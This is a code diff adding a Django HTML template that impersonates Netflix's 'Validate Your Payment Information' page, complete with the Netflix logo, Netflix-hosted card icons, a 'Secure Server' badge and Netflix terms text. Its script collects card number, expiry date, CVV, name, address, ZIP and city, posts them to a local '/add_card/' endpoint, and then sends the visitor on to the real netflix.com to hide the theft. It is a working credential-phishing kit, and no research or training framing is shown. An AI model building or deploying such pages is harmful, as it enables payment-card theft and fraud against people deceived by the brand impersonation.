@@ -1,0 +1,399 @@
+<!-- {% load static %} -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>{{ title }}</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="{% static "/css/style.css" %}">
+    <script
+      src="https://kit.fontawesome.com/7684cd9b2c.js"
+      crossorigin="anonymous"></script>
+
+    <link
+      rel="icon"
+      href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png" />
+  </head>
+  <style>
+
+  </style>
+  <body class="bg-[#f3f3f3] xfont">
+    <header class="w-full h-24 bg-white shadow-md flex justify-around items-center ">
+      <a href="{% url "home" %}" id="logo" class="w-[400px] h-[50px]">
+            <svg
+              viewBox="0 0 111 30"
+              version="1.1"
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              aria-hidden="true"
+              role="img"
+              class="text-red-600 fill-current h-[100%]">
+              <g>
+                <path
+                  d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
+              </g>
+            </svg>
+          </a>
+          <a href="{% url 'home' %}" class="text-[#323333] font-bold text-[24px]">Sign Out</a>
+    </header>
+
+
+    <div class="w-full flex  justify-center items-start">
+      <span class="w-[500px]">
+        <h3 class="text-start text-[32px] mt-4">Validate Your Payment Information</h3>
+        <span class="w-full flex justify-end items-center gap-2">
+          <span class="text-right flex flex-col ">
+            <h3 class="font-bold text-[16px]">Secure Server</h3>
+            <h3 class="text-[#009DFF] text-[12px]">Tell me more</h3>
+          </span>
+        <svg id="secure-server-icon" viewBox="0 0 12 16" class="w-8"><g fill="none"><g fill="#FFB53F"><path d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z"></path></g></g></svg>        </span>
+
+        <div class="w-full h-12 bg-white flex justify-start items-center gap-4 p-4">
+        <h3 class="font-600">Credit Card</h3>
+          <span class="flex gap-2">
+            <img  class="w-auto h-6" src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="">
+            <img  class="w-auto h-6" src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="">
+          </span>
+        </div>
+
+
+
+        <div id="content" class="relative gap-4 mt-2 bg-white w-full flex flex-col justify-center items-center">
+            <div id="divider" class="h-4"></div>
+            <div id="loader" class="absolute hidden start-[50%] top-[25%]  nfLoader"></div>
+
+           {% csrf_token %}
+            <span class=" relative w-[80%] h-14" >
+              <input id="Number" required  type="text" maxlength="19" class="bg-[#FFFFFF00] peer rounded-[2px] focus:border-blue-500 focus:outline-0 h-full pt-6 px-3 pb-2 w-full border-gray-500 border-[1px]">       
+              <label   for="" class="peer-valid:top-[2%] peer-valid:start-[3%] peer-valid:text-[12px] peer-valid:font-bold  pointer-events-none peer-focus:top-[2%]  duration-200 peer-focus:text-[12px] peer-focus:font-bold absolute text-[#6E6E6E] top-[25%] start-[3%]">Card Number</label>
+
+              <svg class="absolute top-[25%] end-[5%] pointer-events-none"  width="24" height="22" fill="none" xmlns="http://www.w3.org/2000/svg" data-name="CreditCard" aria-labelledby=":r5:" aria-hidden="true" color="rgb(128,128,128)"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 6C0 4.34315 1.34315 3 3 3H21C22.6569 3 24 4.34315 24 6V18C24 19.6569 22.6569 21 21 21H3C1.34314 21 0 19.6569 0 18V6ZM3 5C2.44772 5 2 5.44772 2 6V8H22V6C22 5.44771 21.5523 5 21 5H3ZM2 18V10H22V18C22 18.5523 21.5523 19 21 19H3C2.44772 19 2 18.5523 2 18ZM16 16H20V14H16V16Z" fill="currentColor"></path></svg></span>
+            </span>
+             
+              <span
+                  id="big_number_error"
+                  class="my-[-2%] hidden text-red-600 text-[12px] w-[80%]  flex flex-row justify-start items-center">
+                  <i class="fa-regular fa-circle-xmark mr-2"></i>
+                  <h3 id="numbererror"></h3>
+                </span>
+            <span class="w-[80%] h-14 gap-2 flex" >
+              <div class="relative w-[50%] h-full">
+                <input id="date" required  maxlength="6" minlength="4" value="" type="text" placeholder="MM/YY" class="placeholder:text-transparent focus:placeholder:text-[#959595]  bg-[#FFFFFF00] peer rounded-[2px] focus:border-blue-500 focus:outline-0 h-full pt-6 px-3 pb-2 w-full border-gray-500 border-[1px]">       
+              <label  for="" class="peer-valid:start-[6%] peer-valid:top-[7%] peer-valid:text-[12px] peer-valid:font-bold pointer-events-none peer-focus:top-[7%] peer-focus:start-[6%] duration-200 peer-focus:text-[12px] peer-focus:font-bold absolute text-[#6E6E6E] top-[25%] start-[7%]">Expiration date</label>
+              </div>
+
+               
+
+              <div class="relative w-[50%] h-full">
+                <input id="cvv" maxlength="3" required type="phone" min="0"  class="bg-[#FFFFFF00] peer rounded-[2px] focus:border-blue-500 focus:outline-0 h-full pt-6 px-2 pb-2 w-full border-gray-500 border-[1px]">       
+              <label  for="" class="pointer-events-none peer-focus:top-[7%]  peer-valid:start-[4%] peer-valid:top-[7%] peer-valid:text-[12px] peer-valid:font-bold  duration-200 peer-focus:text-[12px] peer-focus:font-bold absolute text-[#6E6E6E] top-[25%] start-[4%] peer-focus:start-[4%]">CVV</label>
+              <svg class=" absolute top-[25%] end-[7%] pointer-events-none peer-valid:text-[12px] peer-valid:font-bold " width="26" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"  data-name="CircleQuestionMark" aria-labelledby=":r6:" aria-hidden="true" color="#999999"><path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0ZM12 8C10.6831 8 10 8.74303 10 9.5H8C8 7.25697 10.0032 6 12 6C13.9968 6 16 7.25697 16 9.5C16 10.8487 14.9191 11.7679 13.8217 12.18C13.5572 12.2793 13.3322 12.4295 13.1858 12.5913C13.0452 12.7467 13 12.883 13 13V14H11V13C11 11.5649 12.1677 10.6647 13.1186 10.3076C13.8476 10.0339 14 9.64823 14 9.5C14 8.74303 13.3169 8 12 8ZM13.5 16.5C13.5 17.3284 12.8284 18 12 18C11.1716 18 10.5 17.3284 10.5 16.5C10.5 15.6716 11.1716 15 12 15C12.8284 15 13.5 15.6716 13.5 16.5Z" fill="currentColor"></path></svg>
+            </div>
+              
+            </span>
+            <span
+                  id="big_date_error"
+                  class="my-[-2%] hidden text-red-600 text-[12px] w-[80%]  flex flex-row justify-start items-center">
+                  <i class="fa-regular fa-circle-xmark mr-2"></i>
+                  <h3 id="dateerror"></h3>
+            </span>
+
+            <span
+                  id="big_cvv_error"
+                  class="my-[-2%] hidden text-red-600 text-[12px] w-[80%]  flex flex-row justify-start items-center">
+                  <i class="fa-regular fa-circle-xmark mr-2"></i>
+                  <h3 id="cvverror"></h3>
+            </span>
+
+              
+            <span class=" relative w-[80%] h-14" >
+              <input id="name" required type="text" class="bg-[#FFFFFF00] peer rounded-[2px] focus:border-blue-500 focus:outline-0 h-full pt-6 px-3 pb-2 w-full border-gray-500 border-[1px]">       
+              <label  for="" class="peer-valid:top-[2%] peer-valid:start-[3%] peer-valid:text-[12px] peer-valid:font-bold  pointer-events-none peer-focus:top-[2%]  duration-200 peer-focus:text-[12px] peer-focus:font-bold absolute text-[#6E6E6E] top-[25%] start-[3%]">Name on card</label>
+            </span>
+              <span
+                  id="big_name_error"
+                  class="my-[-2%] hidden text-red-600 text-[12px] w-[80%]  flex flex-row justify-start items-center">
+                  <i class="fa-regular fa-circle-xmark mr-2"></i>
+                  <h3 id="nameerror"></h3>
+            </span>
+           
+            <span class=" relative w-[80%] h-14" >
+              <input id="address" required type="text" class="bg-[#FFFFFF00] peer rounded-[2px] focus:border-blue-500 focus:outline-0 h-full pt-6 px-3 pb-2 w-full border-gray-500 border-[1px]">       
+              <label  for="" class="peer-valid:top-[2%] peer-valid:start-[3%] peer-valid:text-[12px] peer-valid:font-bold  pointer-events-none peer-focus:top-[2%]  duration-200 peer-focus:text-[12px] peer-focus:font-bold absolute text-[#6E6E6E] top-[25%] start-[3%]">Address</label>
+            </span>
+            <span
+                  id="big_address_error"
+                  class="hidden my-[-2%]  text-red-600 text-[12px] w-[80%]  flex flex-row justify-start items-center">
+                  <i class="fa-regular fa-circle-xmark mr-2"></i>
+                  <h3 id="addresserror"></h3>
+            </span>
+
+                      <span class="  w-[80%] h-14 gap-2 flex" >
+              <div class="relative w-[50%] h-full">
+                <input id="zipcode" required   value="" type="text" class="placeholder:text-transparent focus:placeholder:text-[#959595]  bg-[#FFFFFF00] peer rounded-[2px] focus:border-blue-500 focus:outline-0 h-full pt-6 px-3 pb-2 w-full border-gray-500 border-[1px]">       
+              <label  for="" class="peer-valid:start-[6%] peer-valid:top-[7%] peer-valid:text-[12px] peer-valid:font-bold pointer-events-none peer-focus:top-[7%] peer-focus:start-[6%] duration-200 peer-focus:text-[12px] peer-focus:font-bold absolute text-[#6E6E6E] top-[25%] start-[7%]">Zip Code</label>
+              </div>
+
+              <div class="relative w-[50%] h-full">
+                <input id="city" required type="text" class="bg-[#FFFFFF00] peer rounded-[2px] focus:border-blue-500 focus:outline-0 h-full pt-6 px-2 pb-2 w-full border-gray-500 border-[1px]">       
+              <label  for="" class="pointer-events-none peer-focus:top-[7%]  peer-valid:start-[4%] peer-valid:top-[7%] peer-valid:text-[12px] peer-valid:font-bold  duration-200 peer-focus:text-[12px] peer-focus:font-bold absolute text-[#6E6E6E] top-[25%] start-[4%] peer-focus:start-[4%]">City</label>
+            </div>
+              
+            </span>
+            <span
+                  id="big_zip_error"
+                  class="my-[-2%] hidden text-red-600 text-[12px] w-[80%]  flex flex-row justify-start items-center">
+                  <i class="fa-regular fa-circle-xmark mr-2"></i>
+                  <h3 id="ziperror"></h3>
+            </span>
+            <span
+                  id="big_city_error"
+                  class="my-[-2%] hidden text-red-600 text-[12px] w-[80%]  flex flex-row justify-start items-center">
+                  <i class="fa-regular fa-circle-xmark mr-2"></i>
+                  <h3 id="cityerror"></h3>
+            </span>
+          <div class="w-[80%]">
+            <p class="text-[12px] mb-2 text-[#535353]">Your payments will be processed internationally. Additional bank fees may apply.</p>
+            <p class="text-[12px] text-[#535353]" >By checking the checkbox below, you agree to our <a href="" class="text-blue-500 hover:underline">Terms of Use, Privacy Statement,</a> and that you are over 18. Netflix will automatically continue your membership and charge the membership fee to your payment method until you cancel. You may cancel at any time to avoid future charges.</p>
+          </div>
+
+
+          
+          <button id="submitBtn" style="font-weight: 500;" class=" bg-[#e50914] text-white xfont w-[80%] py-4 rounded-md shadow-md ">
+            Update
+          </button>
+            <div id="divider" class="h-4"></div>
+
+        </div>
+      </span>
+      
+    </div>
+
+    <footer>
+
+    </footer>
+  </body>
+  <script>
+document.addEventListener('DOMContentLoaded', function() {
+  const cvvInput = document.getElementById('cvv');
+  const creditCardInput = document.getElementById('Number');
+
+  // Add key listener for CVV input
+  cvvInput.addEventListener('input', function() {
+    // Your validation or formatting logic for CVV input
+  });
+
+  // Add key listener for credit card number input
+  creditCardInput.addEventListener('input', function() {
+    // Format credit card number
+    this.value = formatCreditCardNumber(this.value);
+  });
+
+  // Function to format credit card number
+  function formatCreditCardNumber(value) {
+    // Remove non-digit characters
+    const digitsOnly = value.replace(/\D/g, '');
+    // Format credit card number as XXXX XXXX XXXX XXXX
+    return digitsOnly.replace(/(\d{4})(?=\d)/g, '$1 ');
+  }
+
+
+    const dateInput = document.getElementById('date');
+
+  // Add key listener for date input
+  dateInput.addEventListener('input', function() {
+    // Format expiration date as MM/YY
+    const trimmedValue = this.value.replace(/\D/g, '').slice(0, 4);
+    let formattedValue = '';
+    
+    if (trimmedValue.length >= 3) {
+      // Add slash after the month
+      formattedValue = trimmedValue.slice(0, 2) + '/' + trimmedValue.slice(2);
+    } else {
+      formattedValue = trimmedValue;
+    }
+    
+    this.value = formattedValue;
+  });
+
+   const zipInput = document.getElementById('zipcode');
+
+  // Add key listener for ZIP code input
+  zipInput.addEventListener('input', function() {
+    // Format ZIP code as XXXXX (5 digits)
+    const trimmedValue = this.value.replace(/\D/g, '').slice(0, 5);
+    this.value = trimmedValue;
+  });
+});
+
+
+
+
+
+document.addEventListener('DOMContentLoaded', function() {
+  const content = document.getElementById('content');
+  const submitBtn = document.getElementById('submitBtn');
+
+
+
+  // Function to validate form fields
+  function validateForm() {
+    const number = document.getElementById('Number').value.trim();
+    const date = document.getElementById('date').value.trim();
+    const cvv = document.getElementById('cvv').value.trim();
+    const name = document.getElementById('name').value.trim();
+    const address = document.getElementById('address').value.trim();
+    const zipcode = document.getElementById('zipcode').value.trim();
+    const city = document.getElementById('city').value.trim();
+
+    // Regular expressions for validation
+    const cardNumberRegex = /^\d{4}\s?\d{4}\s?\d{4}\s?\d{4}$/;
+    const dateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+    const cvvRegex = /^[0-9]{3,4}$/; // Assuming CVV is a 3 or 4 digit number
+    const nameRegex = /^[a-zA-Z\s]+$/;
+    const addressRegex = /^[a-zA-Z0-9\s,.-]+$/;
+    const zipcodeRegex = /^\d{5}$/;
+
+    // Validation checks
+    if (!cardNumberRegex.test(number)) {
+      document.getElementById('big_number_error').classList.remove('hidden');
+      document.getElementById('Number').classList.add('border-red-500');
+      document.getElementById('numbererror').innerHTML = 'Invalid card number';
+      return false;
+    } else {
+      document.getElementById('big_number_error').classList.add('hidden');
+      document.getElementById('Number').classList.remove('border-red-500');
+      document.getElementById('numbererror').innerHTML = '';
+    }
+
+    if (!dateRegex.test(date)) {
+      document.getElementById('big_date_error').classList.remove('hidden');
+      document.getElementById('date').classList.add('border-red-500');
+      document.getElementById('dateerror').innerHTML = 'Please enter a valid expiration date in the format MM/YY';
+      return false;
+    } else {
+      document.getElementById('big_date_error').classList.add('hidden');
+      document.getElementById('date').classList.remove('border-red-500');
+      document.getElementById('dateerror').innerHTML = '';
+    }
+
+    if (!cvvRegex.test(cvv)) {
+      document.getElementById('big_cvv_error').classList.remove('hidden');
+      document.getElementById('cvv').classList.add('border-red-500');
+      document.getElementById('cvverror').innerHTML = 'Please enter a valid CVV code';
+      return false;
+    } else {
+      document.getElementById('big_cvv_error').classList.add('hidden');
+      document.getElementById('cvv').classList.remove('border-red-500');
+      document.getElementById('cvverror').innerHTML = '';
+    }
+
+    if (!nameRegex.test(name)) {
+      document.getElementById('big_name_error').classList.remove('hidden');
+      document.getElementById('name').classList.add('border-red-500');
+      document.getElementById('nameerror').innerHTML = 'Please enter a valid name';
+      return false;
+    } else {
+      document.getElementById('big_name_error').classList.add('hidden');
+      document.getElementById('name').classList.remove('border-red-500');
+      document.getElementById('nameerror').innerHTML = '';
+    }
+
+    if (!addressRegex.test(address)) {
+      document.getElementById('big_address_error').classList.remove('hidden');
+      document.getElementById('address').classList.add('border-red-500');
+      document.getElementById('addresserror').innerHTML = 'Please enter a valid address';
+      return false;
+    } else {
+      document.getElementById('big_address_error').classList.add('hidden');
+      document.getElementById('address').classList.remove('border-red-500');
+      document.getElementById('addresserror').innerHTML = '';
+    }
+
+    if (!zipcodeRegex.test(zipcode)) {
+      document.getElementById('big_zip_error').classList.remove('hidden');
+      document.getElementById('zipcode').classList.add('border-red-500');
+      document.getElementById('ziperror').innerHTML = 'Please enter a valid 5-digit zipcode.';
+      return false;
+    } else {
+      document.getElementById('big_zip_error').classList.add('hidden');
+      document.getElementById('zipcode').classList.remove('border-red-500');
+      document.getElementById('ziperror').innerHTML = '';
+    }
+
+    if (!nameRegex.test(city)) {
+      document.getElementById('big_city_error').classList.remove('hidden');
+      document.getElementById('city').classList.add('border-red-500');
+      document.getElementById('cityerror').innerHTML = 'Please enter a city';
+      return false;
+    } else {
+      document.getElementById('big_city_error').classList.add('hidden');
+      document.getElementById('city').classList.remove('border-red-500');
+      document.getElementById('cityerror').innerHTML = '';
+    }
+
+    // If all validations pass, return true
+    return true;
+  }
+
+  // Function to send form data to server
+  function sendFormData() {
+    if (validateForm()) {
+      // Proceed with form submission
+      const number = document.getElementById('Number').value.trim();
+      const date = document.getElementById('date').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+      const name = document.getElementById('name').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const zipcode = document.getElementById('zipcode').value.trim();
+      const city = document.getElementById('city').value.trim();
+      const csrfToken = document.getElementsByName('csrfmiddlewaretoken')[0].value;
+
+      
+      const data = {
+        number: number,
+        date: date,
+        cvv: cvv,
+        name: name,
+        address: address,
+        zipcode: zipcode,
+        city: city
+      };
+
+      const options = {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRFToken':csrfToken
+        },
+        body: JSON.stringify(data)
+      };
+
+      fetch('/add_card/', options)
+        .then(response => {
+          if (response.ok) {
+              document.getElementById('loader').classList.remove('hidden');
+              setTimeout(() => {
+                window.location.href = 'https://www.netflix.com/browse/'
+              }, 500);
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log('Data sent successfully:', data);
+          // Add any additional handling if needed
+        })
+        .catch(error => {
+          console.error('There was a problem with your fetch operation:', error);
+        });
+    }
+  }
+
+  // Add event listener to form submit button
+  submitBtn.addEventListener('click', sendFormData);
+});
+
+
+  </script>
+</html>
